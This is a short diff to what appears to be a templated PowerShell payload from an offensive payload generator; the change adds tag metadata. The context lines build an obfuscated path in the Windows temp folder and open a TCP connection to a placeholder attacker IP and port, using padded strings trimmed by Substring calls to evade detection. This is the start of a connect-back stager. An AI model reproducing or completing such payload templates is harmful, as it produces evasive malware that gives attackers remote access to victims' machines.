@@ -18,6 +18,8 @@
 #!render_FLAG##True
 #!payStep##format_ps
 #!lang##PowerShell
+#!system_FLAG##[W]
+#!TAGS##[PS]
 
 ${{PSDO_var1}} = '{{PSDO_hfp1}}c:/windows/temp/{{PSD_fname}}{{PSDO_hfp2}}'.Substring({{PSDO_hfp1|length}},{{PSD_fname|length + 16}})
 ${{PSDO_var2}} = New-Object System.Net.Sockets.TcpClient('{{PSDO_hip1}}{{IP_ADDR}}{{PSDO_hip2}}'.Substring({{PSDO_hip1|length}},{{IP_ADDR|length}}), {{PSD_port}})
